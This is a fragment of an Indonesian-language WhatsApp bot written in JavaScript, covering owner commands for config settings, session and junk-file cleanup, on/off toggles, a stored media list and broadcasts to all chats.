if (!q) return warning(`Contoh: ${prefix+command} min tambahin fitur tiktok download`)
if (text.length > 200) return warning('Maksimal 200 Karakter!')
try {
vreden.sendTextWithMentions(m.chat, `📦 *REQUEST - BOT*\n\n- *Name* : @${m.sender.split("@")[0]}\n- *Waktu* : ${jam}\n\n*REQUEST* :\n${text}\n\n_Pesan Telah Dikirimkan_\n> ${footxt}`, m)
await vreden.sendText(numm, `📦 *REQUEST FITUR*\n\n- *Dari* : ${m.sender.split("@")[0]}\n\n${text}\n\n> ${footxt}`, fbot)
} catch (e) {
m.reply('Terjadi Kesalahan')
}
}
break 
case 'sendgc': {
if (!q) return warning(`Contoh: ${prefix+command} 122646754757754|halo`)
var no = text.split('|')[0]
var cet = text.split('|')[1]
if (isNaN(no)) return warning(`ID grup harus berupa angka!`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : no.replace(/[^0-9]/g, '')+'@g.us'
try {
await vreden.sendText(`${users}`, `${cet}`, fconver)
} catch (e) {
m.reply('Terjadi Kesalahan')
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delsampah':{
if (!isCreator) return tolakk(mess.OnlyOwner)
let directoryPath = path.join('./sticker') //&& './media') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return warning('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm")  )
var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return m.reply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})
editp(teks, "Menghapus file sampah...", "Berhasil menghapus semua sampah")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./sticker/${file}`) //&& `./media/${file}`) 
});
});
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'clearsesi1': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let directoryPath = path.join('./sessions1') //&& './media') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return warning('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("session") || item.startsWith("pre-key") || item.startsWith("sender-key")  )
var teks = `Terdeteksi ${filteredArray.length} file sesi\n\n`
if (filteredArray.length == 0) return m.reply(teks)
/*filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})*/
editp(teks, "Menghapus file sampah...", "Berhasil menghapus semua sampah")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./sessions1/${file}`) //&& `./media/${file}`) 
});
});
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'clearsesi2':{
if (!isCreator) return tolakk(mess.OnlyOwner)
let directoryPath = path.join('./sessions2') //&& './media') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return warning('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("session") || item.startsWith("pre-key") || item.startsWith("sender-key")  )
var teks = `Terdeteksi ${filteredArray.length} file sesi\n\n`
if (filteredArray.length == 0) return m.reply(teks)
/*filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})*/
editp(teks, "Menghapus file sampah...", "Berhasil menghapus semua sampah")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./sessions2/${file}`) //&& `./media/${file}`) 
});
});
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'clearsesi3':{
if (!isCreator) return tolakk(mess.OnlyOwner)
let directoryPath = path.join('./sessions3') //&& './media') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return warning('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("session") || item.startsWith("pre-key") || item.startsWith("sender-key")  )
var teks = `Terdeteksi ${filteredArray.length} file sesi\n\n`
if (filteredArray.length == 0) return m.reply(teks)
/*filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})*/
editp(teks, "Menghapus file sampah...", "Berhasil menghapus semua sampah")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./sessions3/${file}`) //&& `./media/${file}`) 
});
});
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'sampah2':
if (!isCreator) return tolakk(mess.OnlyOwner)
let fl = await fs.readdirSync('./')
var teks = `JUMLAH SAMPAH SYSTEM\n\n`
teks += `Total : ${all.filter(v => v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") || v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") || v.endsWith("webp") || v.endsWith("webm") ).map(v=>v).length} Sampah\n\n`
teks += fl.filter(v => v.endsWith("mp3")).map(o=>`${o}\n`).join("");
m.reply(teks)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delsampah2':{
if (!isCreator) return tolakk(mess.OnlyOwner)
let directoryPath = path.join('./') //&& './media') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return warning('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm")  )
var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return m.reply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})
editp(teks, "Menghapus file sampah...", "Berhasil menghapus semua sampah")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./${file}`) //&& `./media/${file}`) 
});
});
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'set': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let [teks1, ...message] = text.split(' ');
message = message.join(' ');
if (teks1 === 'tiktok') {
if (!message) return warning(`*Masukan link TikTok!*\n\ncontoh: ${prefix+command} ${teks1} https://www.tiktok.com/@usr`) 
setting.tiktokk = message
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`TikTok owner diubah ke ${message}`)
} else if (teks1 === 'instagram') {
if (!message) return warning(`*Masukan link Instagram!*\n\ncontoh: ${prefix+command} ${teks1} https://www.instagram.com/@usr`) 
setting.instagram = message
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`InstaGram owner diubah ke ${message}`)
} else if (teks1 === 'gcwa') {
if (!message) return warning(`*Masukan link Grup/Channel!*\n\ncontoh: ${prefix+command} ${teks1} https://chat.whatsapp.com/invite`) 
setting.gcwa = message
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`Grup/Channel owner diubah ke ${message}`)
} else if (teks1 === 'botname') {
if (!message) return warning(`*Masukan Nama Bot!*\n\ncontoh: ${prefix+command} ${teks1} Qioo Official`) 
setting.botName = message
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`Nama Bot diubah ke ${message}`)
} else if (teks1 === 'footer') {
if (!message) return warning(`*Masukan Footer Name!*\n\ncontoh: ${prefix+command} ${teks1} © 2024 • Qioo Official`) 
setting.footer = message
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`Footer Text diubah ke ${message}`)
} else if (teks1 === 'zeeone') {
if (!message) return warning(`*Masukan Apikey Zeeone!*\n\ncontoh: ${prefix+command} ${teks1} alpha736`) 
setting.BotKey = message
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`ZeeoneKey diubah ke ${message}`)
} else if (teks1 === 'skizo') {
if (!message) return warning(`*Masukan Apikey Skizo!*\n\ncontoh: ${prefix+command} ${teks1} vrdbotkey`) 
setting.XznKey = message
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`SkizoKey diubah ke ${message}`)
} else if (teks1 === 'namasaluran') {
if (!message) return warning(`*Masukan Nama Saluran!*\n\ncontoh: ${prefix+command} ${teks1} Qioo Uptime`) 
setting.namasaluran = message
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`Nama Saluran diubah ke ${message}`)
} else if (teks1 === 'idsaluran') {
if (!message) return warning(`*Masukan ID Saluran!*\n\ncontoh: ${prefix+command} ${teks1} 120363282083849178@newsletter`) 
setting.idsaluran = message
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`ID Saluran diubah ke ${message}`)
} else if (teks1 === 'panel') {
if (!message) return warning(`*Masukan Domain Panel!*\n\ncontoh: ${prefix+command} ${teks1} control.vreden.my.id`) 
setting.panel = message
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`Panel Link diubah ke ${message}`)
} else if (teks1 === 'plta') {
if (!message) return warning(`*Masukan PLTA Key!*\n\ncontoh: ${prefix+command} ${teks1} plta_ghjhfthhhfghugbtolol`) 
setting.cred = message
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`PLTA Key diubah ke ${message}`)
} else if (teks1 === 'pltc') {
if (!message) return warning(`*Masukan PLTC Key!*\n\ncontoh: ${prefix+command} ${teks1} pltc_asuugtgutfgugyuvyghugkntl`) 
setting.apiuser = message
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`PLTC Key diubah ke ${message}`)
} else if (teks1 === 'nets') {
if (!message) return warning(`*Masukan Nets ID!*\n\ncontoh: ${prefix+command} ${teks1} 5`) 
setting.apiuser = message
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`Nets ID diubah ke ${message}`)
} else if (teks1 === 'eggs') {
if (!message) return warning(`*Masukan Eggs ID!*\n\ncontoh: ${prefix+command} ${teks1} 15`) 
setting.apiuser = message
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`Eggs ID diubah ke ${message}`)
} else if (teks1 === 'location') {
if (!message) return warning(`*Masukan Location ID!*\n\ncontoh: ${prefix+command} ${teks1} 1`) 
setting.apiuser = message
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply(`Location ID diubah ke ${message}`)
} else {
balas(`*Masukan Type Setting!*

- footer
- botname
- gcwa
- instagram
- tiktok
- panel
- idsaluran
- namasaluran
- skizo
- zeeone
- plta
- pltc
- nets
- eggs
- location

*Contoh:*
.set tiktok

`)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'settings': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (m.isGroup) return warning("Demi Keamanan, Harap Gunakan Command Ini Di Private Chat")
let txt = `------------ » *CONFIG.JSON* « ------------*

Owner Name:
${setting.ownerName}
_ownerName_

Bot Name:
${setting.botName}
_botName_

Grup Bot:
${setting.gcwa}
_gcwa_

Name Channel:
${setting.namasaluran}
_namasaluran_

ID channel:
${setting.idsaluran}
_idsaluran_

Watermark:
${setting.footer}
_footer_

Zeeone Key:
${setting.BotKey}
_BotKey_

Skizo Key:
${setting.XznKey}
_XznKey_

TikTok:
${setting.tiktokk}
_tiktokk_

Instagram:
${setting.instagram}
_instagram_

Panel:
${setting.panel}
_panel_

PLTA key:
${setting.plta}
_plta_

PLTC key:
${setting.pltc}
_pltc_

ID Eggs:
${setting.eggsnya}
_eggsnya_

ID Nets:
${setting.netsnya}
_netsnya_

ID Locations:
${setting.location}
_location_

_*Untuk mengubah setelan config.json diatas ketik ${prefix}set*_

> ${footxt}`
balas(txt)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'setppbot': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!quoted) return warning(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return warning(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return warning(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await vreden.downloadAndSaveMediaMessage(quoted)
await vreden.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply("Done")
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'nsfw':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (args[0] === 'on') {
if (db.data.chats[m.chat].nsfw) return m.reply("Udh on di group ini")
db.data.chats[m.chat].nsfw = true
m.reply("Nsfw berhasil di aktifkan di group ini")
} else if (args[0] === 'off') {
if (!db.data.chats[m.chat].nsfw) return m.reply("Udh off di group ini")
db.data.chats[m.chat].nsfw = false
m.reply("Nsfw berhasil di nonaktifkan di group ini")
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
 }}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'autobio': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autobio === true) return m.reply("Udh on")
setting.autobio = true
m.reply("Autobio berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autobio === false) return m.reply("Udh off")
setting.autobio = false
m.reply("Autobio berhasil dinonaktifkan")
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
 }}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'prefix': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.prefix === true) return m.reply("Udh on")
setting.prefix = true
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply("Prefix berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.prefix === false) return m.reply("Udh off")
setting.prefix = false
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply("Prefix berhasil dinonaktifkan")
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
 }}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'gconly': case 'gruponly': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.gruponly === true) return m.reply("Udh on")
setting.gruponly = true
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
setting.pconly = false
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply("Gruponly berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.gruponly === false) return m.reply("Udh off")
setting.gruponly = false
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply("Gruponly berhasil dinonaktifkan")
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
 }}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'pconly': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.pconly === true) return m.reply("Udh on")
setting.pconly = true
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
setting.gruponly = false
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply("PConly berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.pconly === false) return m.reply("Udh off")
setting.pconly = false
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply("PConly berhasil dinonaktifkan")
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
 }}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'autobackup': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autobackup === true) return m.reply("Udh on")
setting.autobackup = true
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply("Autobackup berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autobackup === false) return m.reply("Udh off")
setting.autobackup = false
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
m.reply("Autobackup berhasil dinonaktifkan")
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
 }}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'anticall': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.anticall === true) return m.reply("Udh on")
setting.anticall = true
m.reply("Anticall berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.anticall === false) return m.reply("Udh off")
setting.anticall = false
m.reply("Anticall berhasil dinonaktifkan")
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'autorespond': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autorespond === true) return m.reply("Udh on")
setting.autorespond = true
m.reply("Autorespond berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autorespond === false) return m.reply("Udh off")
setting.autorespond = false
m.reply("Autorespond berhasil dinonaktifkan")
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
}}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'autoblok': case 'autoblok212': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autoblok212 === true) return m.reply("Udh on")
setting.autoblok212 = true
m.reply("Autoblok berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autoblok212 === false) return m.reply("Udh off")
setting.autoblok212 = false
m.reply("Autoblok berhasil dinonaktifkan")
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
 }}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'autoread': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autoread === true) return m.reply("Udh on")
setting.autoread = true
m.reply("Autoread berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autoread === false) return m.reply("Udh off")
setting.autoread = false
m.reply("Autoread berhasil dinonaktifkan")
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button)
 }}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'addstiker': case 'addsticker': case 'addstik':{
if (!m.key.fromMe && !isCreator) return tolakk(mess.OnlyOwner)
if (!/webp/.test(mime)) return warning(`Contoh:\n${prefix + command} halo`)
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
if (text.includes('|')) return warning(`Contoh:\n${prefix + command} halo`)
let media = await vreden.downloadMediaMessage(quoted)
setiker.push(`${text}`)
fs.writeFileSync(`./database/${text}.webp`, media)
fs.writeFileSync('./database/stik.json', JSON.stringify(setiker))
m.reply(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'liststik': case 'liststiker': case 'liststc':{
teks = '*STICKER LIST :*\n\n'
for (let awokwkwk of setiker) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${setiker.length}*\n\n_Untuk mengambil sticker silahkan kirim pesan sesuai list stiker di atas_`
m.reply(teks)
db.data.users[m.sender].exp += await randomNomor(20)
break
}
case 'addfoto': case 'addimage': case 'addphoto': case 'addimg':{
if (!m.key.fromMe && !isCreator) return tolakk(mess.OnlyOwner)
if (!/image/.test(mime)) return warning(`Contoh:\n${prefix + command} halo`)
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
if (text.includes('|')) return warning(`Contoh:\n${prefix + command} halo`)
let media = await vreden.downloadMediaMessage(quoted)
imagenye.push(`${text}`)
fs.writeFileSync(`./database/${text}.jpg`, media)
fs.writeFileSync('./database/image.json', JSON.stringify(imagenye))
m.reply(`Sukses Menambahkan Image\nCek dengan cara ${prefix}listimg`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'savefile': {
if (!m.key.fromMe && !isCreator) return tolakk(mess.OnlyOwner)
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} ./lib/scraper.js`)
if (!text.includes("./")) return warning(`*• Example* : ${prefix + command} ./package.json`)
if (text.includes('|')) return warning(`Contoh:\n${prefix + command} ./lib/scraper.js`)
if (!quoted) return warning('Mana File nya?')
let media = await vreden.downloadMediaMessage(quoted)
fs.writeFileSync(`${text}`, media)
m.reply(`Sukses Menambahkan file\nCek dengan cara $ ls`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delfoto': case 'delphoto': {
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
if (!imagenye.includes(text)) return balas('Foto tersebut tidak ada!')
let anu = imagenye.indexOf(text)
imagenye.splice(anu, 1)
fs.writeFileSync('./database/image.json', JSON.stringify(imagenye))
fs.unlinkSync(`./database/${text}.jpg`)
balas('Berhasil Dihapus')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'listimage': case 'imagelist': case 'listimg':{
teks = '*IMAGE LIST :*\n\n'
for (let awokwkwk of imagenye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${imagenye.length}*\n\n_Untuk mengambil image silahkan kirim pesan sesuai list image di atas_`
m.reply(teks)
db.data.users[m.sender].exp += await randomNomor(20)
break
}
case 'addvideo': case 'addvidio': case 'addvid':{
if (!m.key.fromMe && !isCreator) return tolakk(mess.OnlyOwner)
if (!/video/.test(mime)) return warning(`Contoh:\n${prefix + command} halo`)
if ((quoted.msg || quoted).seconds > 31) return warning('Maksimal 30 detik')
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
if (text.includes('|')) return warning(`Contoh:\n${prefix + command} halo`)
let media = await vreden.downloadMediaMessage(quoted)
videonye.push(`${text}`)
fs.writeFileSync(`./database/${text}.mp4`, media)
fs.writeFileSync('./database/video.json', JSON.stringify(videonye))
m.reply(`Sukses Menambahkan Video\nCek dengan cara ${prefix}listvid`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delvideo': case 'delvid': {
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
if (!videonye.includes(text)) return balas('Video tersebut tidak ada!')
let anu = videonye.indexOf(text)
videonye.splice(anu, 1)
fs.writeFileSync('./database/video.json', JSON.stringify(videonye))
fs.unlinkSync(`./database/${text}.mp4`)
balas('Berhasil Dihapus')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'videolist': case 'listvidio': case 'listvid': case 'listvideo':{
teks = '*VIDEO LIST :*\n\n'
for (let awokwkwk of videonye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${videonye.length}*\n\n_Untuk mengambil video silahkan kirim pesan sesuai list video di atas_`
m.reply(teks)
db.data.users[m.sender].exp += await randomNomor(20)
break
}
case 'addaud': case 'addaudio': case 'addvn':{
if (!m.key.fromMe && !isCreator) return tolakk(mess.OnlyOwner)
if (!/audio/.test(mime)) return warning(`Contoh:\n${prefix + command} halo`)
if ((quoted.msg || quoted).seconds > 31) return warning('Maksimal 30 detik')
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
if (text.includes('|')) return warning(`Contoh:\n${prefix + command} halo`)
let media = await vreden.downloadMediaMessage(quoted)
audionye.push(`${text}`)
fs.writeFileSync(`./database/${text}.mp3`, media)
fs.writeFileSync('./database/vn.json', JSON.stringify(audionye))
m.reply(`Sukses Menambahkan Vn / audio \nCek dengan cara ${prefix}listvn`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delvn': {
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
if (!audionye.includes(text)) return balas('Vn tersebut tidak ada!')
let anu = audionye.indexOf(text)
audionye.splice(anu, 1)
fs.writeFileSync('./database/vn.json', JSON.stringify(audionye))
fs.unlinkSync(`./database/${text}.mp3`)
balas('Berhasil Dihapus')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'listvn': case 'listaudio':{
teks = '*AUDIO LIST :*\n\n'
for (let awokwkwk of audionye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${audionye.length}*\n\n_Untuk mengambil audio silahkan kirim pesan sesuai list audio di atas_`
m.reply(teks)
db.data.users[m.sender].exp += await randomNomor(20)
break
}
case 'bcimage': case 'bcimg':{
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!text) return warning(`Reply foto dengan caption ${prefix + command} Tes`)
if (!/image/.test(mime)) return warning(`Reply foto dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await vreden.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
vreden.sendMessage(apaan, {image: buffer, caption: txt}, {quoted: fconver})
}
m.reply('Sukses Broadcast')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bcvideo': case 'bcvid':{
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!text) return warning(`Reply video dengan caption ${prefix + command} Tes`)
if (!/video/.test(mime)) return warning(`Reply video dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await vreden.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
vreden.sendMessage(apaan, {video: buffer, caption: txt, mimetype: 'video/mp4', duration: 909090909}, {quoted: fconver})
}
m.reply('Sukses Broadcast')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bcaudio': case 'bcaud':{
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!/audio/.test(mime)) return warning(`Reply audio dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await vreden.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
vreden.sendMessage(apaan, {audio: buffer, mimetype: 'audio/mpeg', ptt: false, duration: 909090909}, {quoted: fconver})
}
m.reply('Sukses Broadcast')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bcvn': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!/audio/.test(mime)) return warning(`Reply audio dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await vreden.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
vreden.sendMessage(apaan, {audio: buffer, mimetype: 'audio/mpeg', ptt: true, duration: 909090909}, {quoted: fconver})
}
m.reply('Sukses Broadcast')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bcstiker': case 'bcstik': case 'bcsticker':{
if (!isCreator) return tolakk(mess.OnlyOwner)
 if (!/webp/.test(mime)) return warning(`Reply stiker dengan caption ${prefix + command}`)
let anu = await store.chats.all().map(v => v.id)
let media = await vreden.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
vreden.sendMessage(apaan, {sticker :{url : media}}, {quoted: fconver})
}
